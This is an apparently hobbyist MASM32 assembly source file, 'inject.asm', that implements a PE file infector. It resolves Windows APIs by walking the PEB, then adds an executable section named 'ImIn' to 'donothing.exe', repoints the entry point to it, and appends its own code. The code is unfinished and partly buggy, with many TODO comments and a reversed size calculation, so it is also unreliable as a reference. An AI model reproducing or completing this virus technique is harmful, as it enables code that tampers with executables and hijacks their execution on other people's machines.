; inject.asm

.386
.model flat, stdcall
assume fs:nothing

option casemap:none

include		\masm32\include\windows.inc
include		\masm32\include\user32.inc
include		\masm32\include\kernel32.inc

includelib	\masm32\lib\user32.lib
includelib	\masm32\lib\kernel32.lib

include		\masm32\include\msvcrt.inc
includelib	\masm32\lib\msvcrt.lib


; Source of life
; Macro to avoid repetition when pushing offset with delta
PDELTA		macro	Addr
			mov	eax, Addr
			add	eax, ebp
			push	eax
		endm
; If we change our mind on ebp
DELTA		equ	ebp + offset
; Such wow
GETADDR		macro	Name, Lib, Save
			PDELTA	offset Name
			push	[DELTA Lib]
			call	[DELTA pGetProcAddress]
			mov	[DELTA Save], eax
		endm


.code

toInject:
; PE
PeFile			dd	?
PeMapObject		dd	?
PeFileMap		dd	?
PeSectionNb		dd	?
PeNtHeader		dd	?
PeOptionalHeader	dd	?
LastSecHeader		dd	?
LastSec			dd	?
PeStartHeader		dd	?
SectionAlignment	dd	?
FileAlignment		dd	?
NewSectionCodeSize	dd	?

; Debug
ErrorMessage	db	"Error",0
FileName	db	"donothing.exe",0
String_string	db	"%s ",0
String_number	db	"%d ",0
NewSectionName	db	"ImIn",0

; DLL
sExitProcess	db	'ExitProcess', 0 
sCreateFile	db	'CreateFile', 0 
sCreateFileMapping	db	'CreateFileMapping', 0 
sMapViewOfFile	db	'MapViewOfFile', 0 
sUnmapViewOfFile	db	'UnmapViewOfFile', 0 
sCloseHandle	db	'CloseHandle', 0 
sWriteFile	db	'WriteFile', 0 
sGetProcAddress	db	'GetProcAddress', 0 
sMessageBoxA	db	'MessageBoxA', 0 
sLoadLibrary	db	'LoadLibraryA', 0 
sHelloWorld	db	'Hello World (MsgBox Without include lib BIATCH!)', 0
sUser32		db	'USER32.DLL', 0
sKernel32	db	'KERNEL32.DLL', 0
pExitProcess	dd	?
pCreateFile	dd	?
pCreateFileMapping	dd	?
pMapViewOfFile	dd	?
pUnmapViewOfFile	dd	?
pCloseHandle	dd	?
pWriteFile	dd	?
pMessageBoxA	dd	?
pKernel32	dd	?
pUser32		dd	?
pLoadLibrary	dd	?
pGetProcAddress	dd	?



start:
; Delta offset for PIC
call	delta
delta:
pop	ebp ; Retrieve eip
sub	ebp, delta ; Ebp + Label to get the data

; GETTING KERNEL32 FUNCTIONS
; GET BASE ADDRESS OF KERNEL32
xor 	ebx, ebx
mov 	ebx, fs:[030h] ; PEB
mov 	ebx, [ebx + 0Ch] ; PEB_LDR
mov 	ebx, [ebx + 014h] ; LBR 1st
mov 	ebx, [ebx] ; 2nd entry
mov 	ebx, [ebx] ; 3rd entry : kernel32 module (I hope so)
mov	ebx, [ebx + 010h] ; Base address Kernel32 (Holy grail ?)
mov	[DELTA pKernel32], ebx

; GET PROPERTIES DLL
mov	esi, [ebx + 03Ch] ; PE Header offset
add	esi, ebx
mov	esi, [esi + 078h] ; Export table offset
add	esi, ebx
mov	edi, [esi + 020h] ; Export Name Table offset
add	edi, ebx
mov	ecx, [esi + 014h] ; Number of functions

; LOOP FROM FUNCTIONS AND GET LoadLibrary & GetProcAddress
mov	eax, ebp
add	eax, offset sGetProcAddress
mov	edx, eax ; Search function
xor	eax, eax ; Counter
checkFunctionName:
mov	ecx, [edi] ; Function name offset
add	ecx, ebx
pusha ; Keep register
call	strcmp
test	eax, eax
popa
jz	functionFound
add	edi, 4 ; Get next function name
inc	eax
jmp	checkFunctionName ; I will find you
functionFound:
mov	edx, [esi + 01Ch] ; List of entry point
add	edx, ebx
mov	edx, [edx + eax * 4 + 4] ; Entry point of function (TODO - Why the fuck +4 ?)
add	edx, ebx
mov	[DELTA pGetProcAddress], edx

; Get User32 (Not without LoadLibrary !)
GETADDR	sLoadLibrary, pKernel32, pLoadLibrary
PDELTA	offset sUser32
call	[DELTA pLoadLibrary] ; LoadLibrary("user32.dll")
mov	[DELTA pUser32], eax
; GET ALL THE THINGS !
GETADDR	sMessageBoxA, pUser32, pMessageBoxA
GETADDR	sExitProcess, pKernel32, pExitProcess
GETADDR	sCreateFile, pKernel32, pCreateFile
GETADDR	sCreateFileMapping, pKernel32, pCreateFileMapping
GETADDR	sMapViewOfFile, pKernel32, pMapViewOfFile
GETADDR	sUnmapViewOfFile, pKernel32, pUnmapViewOfFile
GETADDR	sCloseHandle, pKernel32, pCloseHandle
GETADDR	sWriteFile, pKernel32, pWriteFile
; Test!
push	0
PDELTA	offset sHelloWorld
PDELTA	offset sHelloWorld
push	0
call	[DELTA pMessageBoxA]

; Get ExitProcess
PDELTA	offset sExitProcess
push	[DELTA pKernel32]
call	[DELTA pGetProcAddress]

jmp	begin

; EXIT TEST
push	0
call 	eax

; Compare two strings : ecx/edx (EAX[0]: MATCH)
strcmp:
mov	al, [ecx]
mov	ah, [edx]
cmp	al, ah
jne	nomatch
test	al, al
jz	match
test	ah, ah
jz	match
inc	ecx
inc	edx
jmp	strcmp
match:
xor	eax, eax
nomatch:
ret




begin:

; OPEN FILE
push	0
push	0
push	OPEN_EXISTING
push	0
push	0
mov	eax, GENERIC_READ
or	eax, GENERIC_WRITE
push	eax
PDELTA	offset FileName
call	CreateFile
call	CheckError
mov	[DELTA PeFile], eax

; CREATE_FILE_MAPPING
push	NULL
push	0
push	0
push	PAGE_READWRITE
push	NULL
PDELTA	PeFile
call	CreateFileMapping
call	CheckError
mov	[DELTA PeMapObject], eax

; MAP_VIEW_OF_FILE
push	0
push	0
push	0
mov	eax,	FILE_MAP_READ
or	eax,	FILE_MAP_WRITE
push	eax
PDELTA	PeMapObject
call	MapViewOfFile
call	CheckError
mov	[DELTA PeFileMap], eax
mov	ebx, eax

; CHECK MAGIC
cmp	word ptr [ebx], IMAGE_DOS_SIGNATURE
jne	JumpCheckError


; CHECK IMAGE_NET_SIGNATURE
mov	ecx, ebx
add	ecx, 03Ch
mov	edx, ebx
add	edx, dword ptr [ecx]
mov	[DELTA PeNtHeader], edx
cmp	dword ptr [edx], IMAGE_NT_SIGNATURE
jne	JumpCheckError

; GET OPTIONAL HEADER useless so far
mov	[DELTA PeOptionalHeader], edx
add	[DELTA PeOptionalHeader], 018h

; GET NUMBER SECTIONS
mov	eax, edx
add	eax, 6
mov	[DELTA PeSectionNb], eax
xor	ecx, ecx
mov	cx, word ptr[eax]

; GET ALIGNMENT
add	eax, 032h
mov	esi, [eax]
mov	[DELTA SectionAlignment], esi
add	eax, 04h
mov	esi, [eax]
mov	[DELTA FileAlignment], esi


; LOOP SECTIONS HEADER
mov	esi, edx
add	esi, 0F8h
mov	[DELTA PeStartHeader], esi
mov	ebx, esi ; Keep start of Headers
mov	LastSec, 0
Loop_SectionHeader:
; GET LAST SECTION
mov	eax, esi
add	eax, 0Ch
cmp	LastSec, eax
jg	keepLastSec
mov	[DELTA LastSecHeader], esi
mov	[DELTA LastSec], eax
keepLastSec:
; SHOW NAME
mov	eax, esi
call	DebugMessageBox
add	esi, 028h
loop	Loop_SectionHeader


; CREATE NEW SECTION HEADER
; COPY FIRST ONE INTO NEW ONE
mov	ecx, 020h
mov	edi, esi ; Destination bytes
mov	esi, [DELTA PeStartHeader] ; Source bytes
mov	ebx, edi ; Keep start of new header
CreateNewHeader:
lodsb
stosb
loop	CreateNewHeader

; INCREMENT NUMBER OF SECTION
xor	eax, eax
mov	edi, [DELTA PeSectionNb]
mov	ax, word ptr [edi]
inc	eax
mov	ecx, [DELTA PeSectionNb]
mov	word ptr [ecx], ax

; SET PROPERTIES
; SizeOfRawData aligned on FileAlignement (512)
; PointerToRawData = prev.PointerToRawData + prev.SizeOfRawData
; VirtualSize = actual size of the section
; VirtualAdress = prev.VirtualAdress + prev.VirtualSize aligned on SectionAlignment (4096 (0xFFF)) (je crois?)

; COPY THE NAME
mov	ecx, 08h ; Length of Name
mov	esi, offset NewSectionName ; Source bytes
add	esi, ebp
mov	edi, ebx ; Destination bytes
pusha ; Keep registers
CopySectionName:
lodsb
stosb
loop CopySectionName

; Virtual Size
popa	; Retrieve registers
add	edi, 08h
mov	[DELTA NewSectionCodeSize], toInject - endInject ; Size of actual code in new section
mov	ecx, NewSectionCodeSize
mov	[edi], ecx

; Virtual Address (Last section VA + Alignment TODO Check if our code not superior ?)
add	edi, 04h
mov	ecx, [DELTA LastSecHeader]
add	ecx, 08h ; LastSecHeader.VirtualSize
mov	eax, [ecx]
add	ecx, 04h ; LastSecHeader.VirtualAdress
mov	ebx, ecx ; Keep VAddress for Raw data
add	eax, [ecx]
; pImageSectionHeader->VirtualAddress = (((EndSections - 1) / SectionAlignment) + 1) * SectionAlignment;
sub eax, 1
xor	edx, edx
div	[DELTA SectionAlignment] ; divide eax by SectionAlignement
add	eax, 1
mul	[DELTA SectionAlignment]
mov	[edi], eax
mov	esi, eax ; Keep New VA for EntryPoint

; Size of raw data (FileAlignment TODO Check if our code not superior?)
add	edi, 04h
mov	eax, [DELTA NewSectionCodeSize]
sub	eax, 1
xor	edx, edx
div	[DELTA FileAlignment] ; divide eax by FileAlignment
add	eax, 1
mul	[DELTA FileAlignment]
mov	[edi], eax


; Pointer to raw data (Get last section pointer to raw data + size of raw data)
add	edi, 04h
mov	ecx, ebx
add	ecx, 04h
mov	eax, [ecx]
add	ecx, 04h
add	eax, [ecx]
mov	[edi], eax

; Characteristics
add	edi, 010h
mov	ecx, IMAGE_SCN_MEM_READ
or	ecx, IMAGE_SCN_MEM_WRITE
or	ecx, IMAGE_SCN_MEM_EXECUTE
or	ecx, IMAGE_SCN_CNT_CODE
mov	[edi], ecx


; CHANGE PE PROPERTIES
; TODO CHANGE SIZE OF CODE
mov	eax, [DELTA PeNtHeader]
add	eax, 01Ch
; CHANGE ENTRY POINT TODO Need to size every section ?
add	eax, 0Ch
mov	[eax], esi
; CHANGE SIZE OF IMAGE TODO Size every function ?
add	eax, 028h
add	ebx, 08h
add	esi, 01h ; TODO - WTF IS THIS SHIT ? (Size of all virtual size + 1?)
mov	[eax], esi
; CLOSE
PDELTA	PeFileMap
call	UnmapViewOfFile
PDELTA	PeMapObject
call	CloseHandle
PDELTA	PeFile
call	CloseHandle


; CREATE NEW SECTION 
; OPEN FILE
push	0
push	FILE_ATTRIBUTE_NORMAL	
push	OPEN_ALWAYS
push	0
push	FILE_SHARE_READ
push	FILE_APPEND_DATA
PDELTA	offset FileName
call	CreateFile
mov	[DELTA PeFile], eax
call	CheckError

; INSERT OPCODE
mov	ecx, 512 ; Number of bytes
mov	esi, [DELTA toInject] ; Source bytes
push	0
push	0
push	ecx
push	esi
PDELTA	PeFile
call	WriteFile
call	CheckError

; CLOSE
PDELTA	PeFile
call	CloseHandle


; EXIT
push	0
call 	ExitProcess


; Debug
print_str	proc
pusha
push	eax
;push	offset String_string
;call	crt_printf
popa
ret
print_str	endp

print_int	proc
pusha
push	eax
push	offset String_number
call	crt_printf
popa
ret
print_int	endp

CheckError:
cmp		eax, INVALID_HANDLE_VALUE
jne		EndErrorDebug
JumpCheckError:
mov		eax, offset FileName
call	DebugMessageBox
push	eax
push	0
call	ExitProcess
EndErrorDebug:
ret

DebugMessageBox	proc
pusha
push	MB_OK
push	offset ErrorMessage
push	eax
push	0
call	MessageBoxA
popa
ret
DebugMessageBox	endp

endInject:

end		start
